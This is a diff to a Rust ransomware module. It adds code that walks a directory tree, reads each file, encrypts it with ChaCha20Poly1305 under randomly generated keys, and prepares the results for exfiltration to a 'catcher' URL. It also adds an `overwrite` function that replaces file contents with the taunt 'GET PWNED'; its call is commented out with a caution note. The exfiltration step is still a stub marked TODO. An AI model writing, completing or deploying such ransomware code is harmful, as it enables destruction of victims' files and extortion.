@@ -1,10 +1,17 @@
+use chacha20poly1305::{
+    aead::{Aead, AeadCore, KeyInit, OsRng},
+    ChaCha20Poly1305, Key, Nonce,
+};
 use log::{error, info};
 use std::{
     fmt,
     fs::{read_dir, DirEntry, File, ReadDir},
+    io::{Read, Write},
     path::PathBuf,
 };
+
 type ByteCount = usize;
+static TAUNT: &[u8; 9] = b"GET PWNED";
 
 pub fn ransom(root: &str, catcher: &str) {
     info!("ransom mode");
@@ -18,18 +25,48 @@ pub fn ransom(root: &str, catcher: &str) {
 
 #[derive(Debug)]
 struct EncryptedFile {
-    key: String,
-    buf: String,
+    key: Key,
+    nonce: Nonce,
+    ciphertext: Vec<u8>,
     path: PathBuf,
 }
 
-impl From<DirEntry> for EncryptedFile {
-    fn from(value: DirEntry) -> Self {
-        let key: String = String::from("");
-        let buf: String = String::from("");
+impl EncryptedFile {
+    fn ciphertext(&self) -> &[u8] {
+        self.ciphertext.as_ref()
+    }
+}
+
+impl From<&DirEntry> for EncryptedFile {
+    fn from(value: &DirEntry) -> Self {
+        let mut buf: String = String::new();
         let path: PathBuf = value.path();
 
-        Self { buf, path, key }
+        if let Ok(mut file) = File::open(path) {
+            if let Ok(bytes) = file.read_to_string(&mut buf) {
+                info!("wrote {bytes:?} bytes");
+            }
+        }
+
+        let key = ChaCha20Poly1305::generate_key(&mut OsRng);
+        let cipher = ChaCha20Poly1305::new(&key);
+        let nonce = ChaCha20Poly1305::generate_nonce(&mut OsRng); // 96-bits; unique per message
+        if let Ok(ciphertext) = cipher.encrypt(&nonce, buf.as_bytes().as_ref()) {
+            Self {
+                ciphertext,
+                nonce,
+                path: value.path(),
+                key,
+            }
+        } else {
+            // just the plaintext
+            Self {
+                ciphertext: buf.as_bytes().to_vec(),
+                nonce,
+                path: value.path(),
+                key,
+            }
+        }
     }
 }
 
@@ -44,7 +81,7 @@ fn encrypt_dir(files: ReadDir, catcher: &str) -> () {
                     }
                 } else {
                     if let Ok(byte_count) = encrypt_file(entry, catcher) {
-                        info!("byte count: {byte_count:?}{}", '\n')
+                        info!("encrypted {byte_count:?} bytes{}", '\n')
                     } else {
                         error!("could not encrypt")
                     }
@@ -59,11 +96,19 @@ fn encrypt_dir(files: ReadDir, catcher: &str) -> () {
 }
 
 fn encrypt_file(file: DirEntry, catcher: &str) -> Result<ByteCount, &'static str> {
-    let enc_file = EncryptedFile::from(file);
+    let enc_file = EncryptedFile::from(&file);
     exfiltrate(enc_file, catcher)
+    // overwrite(file) // CAUTION: OVERWRITES ALL FILES BELOW CURRENT DIRECTORY NODE
 }
 
 fn exfiltrate(file: EncryptedFile, catcher: &str) -> Result<ByteCount, &'static str> {
     info!("sending {file:?} to URL: {catcher:?}");
-    Ok(0) // TODO
+    Ok(file.ciphertext().len()) // TODO
+}
+
+fn overwrite(file: DirEntry) -> Result<ByteCount, &'static str> {
+    if let Ok(mut new_file) = File::create(file.path()) {
+        new_file.write_all(TAUNT);
+    }
+    Ok(0)
 }
